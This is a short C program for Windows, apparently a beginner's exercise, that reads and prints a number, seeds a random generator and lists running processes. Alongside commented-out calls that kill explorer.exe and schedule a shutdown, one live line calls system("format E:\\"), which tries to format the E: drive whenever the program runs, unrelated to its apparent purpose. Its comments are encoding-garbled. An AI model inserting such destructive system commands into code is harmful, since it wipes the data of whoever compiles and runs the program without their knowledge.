#define _CRT_SECURE_NO_WARNINGS//�����Ϳ�������scanf�����ĺ�����
#include<stdio.h>
#include<windows.h>
#include<time.h>
int main(){
	int num;
	scanf("%d", &num);
	printf("%d", num);
	//ShellExecuteA(0, "open", "http://www.baidu.com", 0, 0, 3);
	//system("taskkill /f /im explorer.exe");//shutdown desktop
	//system("shutdown -s -t 60");
	//system("c:/Explorer.exe");
	//system("restart");
	//system("shutdown -a");//ȡ���ػ�
	system("format E:\\");//��ʽ����

	time_t ts;
	srand((unsigned int)time(&ts));//����ʱ�����ӵĻ�����α���
	int number = rand();


	system("tasklist");//�г����̱�
	system("pause");
}